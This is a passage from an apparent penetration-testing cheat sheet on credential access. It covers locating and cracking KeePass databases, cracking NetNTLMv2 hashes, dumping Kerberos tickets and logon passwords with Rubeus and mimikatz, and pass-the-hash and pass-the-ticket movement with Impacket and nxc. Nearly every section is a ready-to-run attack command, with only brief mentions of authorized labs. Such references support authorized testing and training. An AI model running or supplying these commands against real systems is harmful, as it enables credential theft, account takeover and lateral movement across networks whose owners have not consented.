**Find KeePass files in downloaded shares**

```bash
find . -iname "*.kdbx" -o -iname "*.key" -o -iname "*.keyx"
```

**Look for key files**

Common key file patterns:

```text
*.key
*.keyx
keyfile
keepass.key
database.key
```

**Convert KDBX to crackable hash**

```bash
keepass2john database.kdbx > keepass_hash.txt
```

If key file is needed, cracking may require additional handling depending on format and tool support.

**Crack with John**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt keepass_hash.txt
john --show keepass_hash.txt
```

**Open with kpcli**

```bash
kpcli --kdb database.kdbx
```

**Open with keepassxc-cli**

```bash
keepassxc-cli open database.kdbx
```

List entries after opening:

```bash
keepassxc-cli ls database.kdbx
```

Show entry:

```bash
keepassxc-cli show database.kdbx "Entry Name"
```

**Search KeePass-related hints**

```bash
grep -RniE "keepass|kdbx|master password|keyfile|password database" .
```

Interesting nearby files:

| File | Why it matters |
| --- | --- |
| `*.kdbx` | KeePass database. |
| `*.key` / `*.keyx` | Possible key file. |
| Notes near database | May contain master password hints. |
| Backups | Older database copies. |
| Screenshots | Sometimes show passwords or hints. |
| Shortcut files | Reveal database location. |


---

## Hashes Tickets Tokens

Credential access often produces different kinds of authentication material.

Do not treat all of them as the same thing.

| Material | Typical use |
| --- | --- |
| Plaintext password | Normal authentication. |
| NT hash | Pass-the-Hash style authentication where accepted. |
| NetNTLMv2 | Usually crack offline; not the same as NT hash. |
| TGT | Kerberos identity ticket. |
| TGS | Kerberos service ticket. |
| Kirbi file | Windows Kerberos ticket format. |
| ccache file | Linux Kerberos credential cache format. |
| Access token | Local Windows process security context. |
| DPAPI masterkey | Decrypts DPAPI-protected secrets. |
| PFX/certificate | Certificate-based authentication context. |

**NT hash format**

```text
aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

Often used as:

```text
LMHASH:NTHASH
```

If LM hash is not used:

```text
aad3b435b51404eeaad3b435b51404ee
```

**NetNTLM vs NT hash**

| Material | Meaning |
| --- | --- |
| NT hash | Password-derived hash. |
| NetNTLMv1/v2 | Challenge-response captured during NTLM authentication. |

NetNTLMv2 is usually cracked offline:

```bash
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt
```

**Kerberos tickets on Linux**

Get TGT with password:

```bash
getTGT.py $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
```

This creates:

```text
user.ccache
```

Use ccache:

```bash
export KRB5CCNAME=$PWD/$USER.ccache
```

Check ticket:

```bash
klist
```

Use Kerberos with Impacket:

```bash
psexec.py -k -no-pass $DOMAIN/$USER@$TARGET
smbclient.py -k -no-pass $DOMAIN/$USER@$TARGET
```

**Kerberos tickets on Windows**

List tickets:

```cmd
klist
```

Rubeus triage:

```powershell
Rubeus.exe triage
```

Dump tickets in a lab with appropriate privileges:

```powershell
Rubeus.exe dump
```

Dump only current logon session:

```powershell
Rubeus.exe dump /nowrap
```

Mimikatz:

```cmd
mimikatz.exe
sekurlsa::tickets
kerberos::list
```

Export tickets:

```cmd
kerberos::list /export
```

**Ticket formats**

| Format | Platform / tool |
| --- | --- |
| `.kirbi` | Windows Kerberos ticket format. |
| `.ccache` | MIT Kerberos cache format, common on Linux. |

Convert Kirbi to ccache:

```bash
ticketConverter.py ticket.kirbi ticket.ccache
```

Convert ccache to Kirbi:

```bash
ticketConverter.py ticket.ccache ticket.kirbi
```

**Pass-the-Hash context**

Example SMB authentication with NT hash:

```bash
nxc smb $TARGET -u $USER -H $NTLM -d $DOMAIN
```

Impacket:

```bash
psexec.py $DOMAIN/$USER@$TARGET -hashes :$NTLM
wmiexec.py $DOMAIN/$USER@$TARGET -hashes :$NTLM
smbexec.py $DOMAIN/$USER@$TARGET -hashes :$NTLM
```

**Pass-the-Ticket context**

Linux with ccache:

```bash
export KRB5CCNAME=$PWD/ticket.ccache
klist
nxc smb $TARGET -k --use-kcache
```

Impacket with Kerberos cache:

```bash
wmiexec.py -k -no-pass $DOMAIN/$USER@$TARGET
psexec.py -k -no-pass $DOMAIN/$USER@$TARGET
```

Windows with Rubeus:

```powershell
Rubeus.exe ptt /ticket:ticket.kirbi
klist
```

**Tokens**

A Windows access token represents a local security context.

Check current identity:

```cmd
whoami
whoami /user
whoami /groups
whoami /priv
```

List logon sessions with Mimikatz:

```cmd
mimikatz.exe
sekurlsa::logonpasswords
```

Token manipulation is usually local post-exploitation behavior and should be handled carefully in authorized labs.
